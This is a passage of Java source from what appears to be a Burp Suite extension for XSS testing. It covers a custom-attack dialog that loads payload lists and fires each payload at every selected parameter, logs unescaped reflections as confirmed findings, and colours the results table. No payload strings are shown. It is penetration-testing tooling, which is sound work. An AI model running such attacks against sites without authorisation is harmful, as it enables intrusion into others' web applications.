                    String cur = payloadArea.getText();
                    payloadArea.setText(cur.isEmpty() ? set : cur + "\n" + set);
                }
            });
            srcRow.add(insertBuiltin);
            JButton loadFile = new JButton("Load from file...");
            loadFile.addActionListener(e -> loadPayloadsFromFile());
            srcRow.add(loadFile);
            JButton clearBtn = new JButton("Clear");
            clearBtn.addActionListener(e -> payloadArea.setText(""));
            srcRow.add(clearBtn);
            top.add(srcRow, BorderLayout.SOUTH);

            JPanel runRow = new JPanel(new FlowLayout(FlowLayout.LEFT, 8, 4));
            startBtn.addActionListener(e -> startAttack());
            stopBtn.addActionListener(e -> cancelled.set(true));
            stopBtn.setEnabled(false);
            runRow.add(startBtn);
            runRow.add(stopBtn);
            runRow.add(progress);

            resultTable.setFillsViewportHeight(true);
            resultTable.setRowHeight(20);
            JScrollPane resultScroll = new JScrollPane(resultTable);
            resultScroll.setBorder(BorderFactory.createTitledBorder("Results (live)"));
            installResultContextMenu();

            JPanel center = new JPanel(new BorderLayout(4, 4));
            center.add(top, BorderLayout.NORTH);
            center.add(runRow, BorderLayout.CENTER);
            JSplitPane split = new JSplitPane(JSplitPane.VERTICAL_SPLIT, center, resultScroll);
            split.setResizeWeight(0.4);
            split.setDividerLocation(260);
            add(split, BorderLayout.CENTER);

            setSize(760, 560);
            setLocationRelativeTo(owner);
        }

        private void installResultContextMenu() {
            JPopupMenu menu = new JPopupMenu();
            JMenuItem toRep = new JMenuItem("Send request to Repeater");
            toRep.addActionListener(e -> {
                int row = resultTable.getSelectedRow();
                if (row < 0 || row >= rows.size()) return;
                Row r = rows.get(row);
                ContextualReflectionEngine.AttackAttempt a = r.attempt;
                XssFinding f = r.target.finding;
                if (a.requestResponse == null || a.requestResponse.getRequest() == null) return;
                try {
                    callbacks.sendToRepeater(f.host, f.port > 0 ? f.port : (f.https ? 443 : 80),
                            f.https, a.requestResponse.getRequest(), "Custom: " + f.parameter);
                } catch (Exception ex) {
                    JOptionPane.showMessageDialog(CustomAttackDialog.this, "Send to Repeater failed: " + ex.getMessage());
                }
            });
            menu.add(toRep);
            resultTable.setComponentPopupMenu(menu);
        }

        private void loadPayloadsFromFile() {
            JFileChooser fc = new JFileChooser();
            if (fc.showOpenDialog(this) != JFileChooser.APPROVE_OPTION) {
                return;
            }
            try {
                StringBuilder sb = new StringBuilder();
                for (String line : java.nio.file.Files.readAllLines(fc.getSelectedFile().toPath(), StandardCharsets.UTF_8)) {
                    sb.append(line).append('\n');
                }
                String cur = payloadArea.getText();
                payloadArea.setText(cur.isEmpty() ? sb.toString() : cur + "\n" + sb);
            } catch (Exception ex) {
                JOptionPane.showMessageDialog(this, "Could not read file: " + ex.getMessage(),
                        "Load payloads", JOptionPane.ERROR_MESSAGE);
            }
        }

        private List<String> parsePayloads() {
            List<String> out = new ArrayList<>();
            for (String line : payloadArea.getText().split("\n", -1)) {
                String t = line.trim();
                if (t.isEmpty() || t.startsWith("#")) {
                    continue;
                }
                out.add(line); // keep internal spacing; only outer blank/comment lines are filtered
            }
            return out;
        }

        private void startAttack() {
            if (running) {
                return;
            }
            List<String> payloads = parsePayloads();
            if (payloads.isEmpty()) {
                JOptionPane.showMessageDialog(this, "Paste, load, or insert at least one payload first.",
                        "Custom attack", JOptionPane.INFORMATION_MESSAGE);
                return;
            }
            final int cap = 2000;
            if (payloads.size() > cap) {
                int res = JOptionPane.showConfirmDialog(this,
                        payloads.size() + " payloads is a lot (capped at " + cap + " for this run). Continue with the first "
                        + cap + "?", "Custom attack", JOptionPane.YES_NO_OPTION);
                if (res != JOptionPane.YES_OPTION) {
                    return;
                }
                payloads = payloads.subList(0, cap);
            }
            rows.clear();
            resultModel.setRowCount(0);
            cancelled.set(false);
            running = true;
            startBtn.setEnabled(false);
            stopBtn.setEnabled(true);
            final List<String> finalPayloads = payloads;
            Thread worker = new Thread(() -> runAttack(finalPayloads), "XSSDetector-CustomAttack");
            worker.setDaemon(true);
            worker.start();
        }

        /** Every selected target gets the WHOLE payload list, one target at a
         *  time, so progress/results read as complete per-target passes rather
         *  than interleaved. */
        private void runAttack(List<String> payloads) {
            int reflected = 0;
            int totalAttempts = payloads.size() * targets.size();
            int done = 0;
            outer:
            for (Target t : targets) {
                for (String payload : payloads) {
                    if (cancelled.get()) {
                        break outer;
                    }
                    ContextualReflectionEngine.AttackAttempt a = engine.runCustomPayload(t.injector, t.service, payload);
                    if (a.reflectedUnescaped) {
                        reflected++;
                        recordConfirmedCustom(t, a);
                    }
                    done++;
                    final int doneSoFar = done;
                    final int reflectedSoFar = reflected;
                    final Target target = t;
                    SwingUtilities.invokeLater(() -> {
                        rows.add(new Row(target, a));
                        resultModel.addRow(new Object[]{
                                truncate(target.finding.parameter + " @ " + target.finding.host, 60),
                                truncate(a.payload, 120),
                                a.reflectedUnescaped ? "YES" : (a.error != null ? "error" : "no"),
                                a.statusCode > 0 ? String.valueOf(a.statusCode) : (a.error != null ? a.error : "-")
                        });
                        progress.setText(doneSoFar + " / " + totalAttempts + " tested, " + reflectedSoFar + " reflected");
                    });
                }
            }
            SwingUtilities.invokeLater(() -> {
                running = false;
                startBtn.setEnabled(true);
                stopBtn.setEnabled(false);
                if (cancelled.get()) {
                    progress.setText(progress.getText() + " (stopped)");
                }
            });
        }

        /** A custom payload that came back verbatim/unescaped is live, confirmed
         *  evidence -- add it to the main Live Results view like any other find. */
        private void recordConfirmedCustom(Target t, ContextualReflectionEngine.AttackAttempt a) {
            try {
                IHttpRequestResponse rr = a.requestResponse;
                if (rr == null) {
                    return;
                }
                XssFinding finding = t.finding;
                // FindingStore de-duplicates by context|parameter|url -- each
                // confirmed custom payload needs a distinct context label or only
                // the FIRST reflected payload for this target would ever survive.
                int n = t.confirmedCount.incrementAndGet();
                XssFinding xf = new XssFinding(
                        "High", XssFinding.STATUS_CONFIRMED,
                        finding.context + " (custom payload #" + n + ")", finding.parameter,
                        finding.method, finding.host, finding.url, "Custom Attack", a.payload,
                        rr.getRequest(), rr.getResponse());
                xf.reqHighlight = a.payload;
                xf.respHighlight = a.payload;
                xf.technique = "custom payload list";
                xf.paramSource = finding.paramSource;
                xf.testedContextually = true;
                xf.port = finding.port;
                xf.https = finding.https;
                FindingStore.get().add(xf);
            } catch (Exception ignored) {
                // reporting-side failures must never break the running attack
            }
        }

        private String truncate(String s, int max) {
            if (s == null) return "";
            return s.length() <= max ? s : s.substring(0, max) + "...";
        }
    }

    private class ResultsTableModel extends AbstractTableModel {
        private final String[] cols =
                {"Time", "Severity", "Status", "Tested", "Context", "Parameter", "Param Source", "URL", "Source"};
        private List<XssFinding> rows = new ArrayList<>();

        void setRows(List<XssFinding> r) {
            this.rows = r;
            fireTableDataChanged();
        }

        XssFinding getRow(int viewRow) {
            if (viewRow < 0 || viewRow >= rows.size()) return null;
            return rows.get(viewRow);
        }

        @Override public int getRowCount() { return rows.size(); }
        @Override public int getColumnCount() { return cols.length; }
        @Override public String getColumnName(int c) { return cols[c]; }
        @Override public boolean isCellEditable(int r, int c) { return false; }

        @Override
        public Object getValueAt(int r, int c) {
            XssFinding f = rows.get(r);
            switch (c) {
                case 0: return timeFmt.format(new Date(f.time));
                case 1: return f.severity;
                case 2: return f.status;
                // Whether a real context-specific payload was actively injected and
                // checked for THIS row, vs. a passive text match seen while browsing
                // that has not been probed yet.
                case 3: return f.testedContextually ? "Yes" : "No";
                case 4: return f.context;
                case 5: return f.parameter;
                case 6: return f.paramSource == null || f.paramSource.isEmpty() ? "-" : f.paramSource;
                case 7: return f.url;
                case 8: return f.source;
                default: return "";
            }
        }
    }

    /** Column index of the "Tested" cell in {@link ResultsTableModel#cols}. */
    private static final int COL_STATUS = 2;
    private static final int COL_TESTED = 3;

    /**
     * Colours the whole row by severity/risk so the riskiest findings stand out
     * at a glance, and additionally:
     *  - bolds the Status cell red for a live-CONFIRMED break-out;
     *  - colours the Tested cell green ("Yes" - a real payload was actually
     *    fired at this exact spot) vs. grey ("No" - a passive text match only,
     *    seen while browsing but never actively probed), so the two very
     *    different confidence levels behind a "Reflected" row are never
     *    confused with each other;
     *  - gives an actively-tested-but-not-yet-exploitable Info row a slightly
     *    warmer (amber) tint than a purely passive, unprobed one, since the
     *    former already survived contact with the real application and is a
     *    stronger candidate for manual follow-up / a bypass attempt.
     */
    private class SeverityRowRenderer extends DefaultTableCellRenderer {
        @Override
        public Component getTableCellRendererComponent(JTable t, Object v, boolean sel,
                                                       boolean focus, int row, int col) {
            Component comp = super.getTableCellRendererComponent(t, v, sel, focus, row, col);
            if (!sel) {
                XssFinding f = model.getRow(row);
                Color bg = Color.WHITE;
                Color fg = Color.BLACK;
                if (f != null) {
                    if ("High".equals(f.severity)) {
                        bg = new Color(0xFD, 0xE7, 0xE9);
                    } else if ("Medium".equals(f.severity)) {
                        bg = new Color(0xFF, 0xF4, 0xDE);
                    } else if (f.testedContextually) {
                        // Info, but actively tested: higher potential than a mere
                        // passive sighting -- a distinct amber tint, not blue.
                        bg = new Color(0xFC, 0xF1, 0xD8);
                    } else {
                        bg = new Color(0xF0, 0xF4, 0xF8);
                    }
                    if (col == COL_STATUS && XssFinding.STATUS_CONFIRMED.equals(f.status)) {
                        fg = new Color(0xB0, 0x00, 0x20);
                    } else if (col == COL_TESTED) {
                        fg = f.testedContextually ? new Color(0x1B, 0x7A, 0x1B) : new Color(0x80, 0x80, 0x80);
                    }
                }
                comp.setBackground(bg);
                comp.setForeground(fg);
            }
            return comp;
        }
    }
}
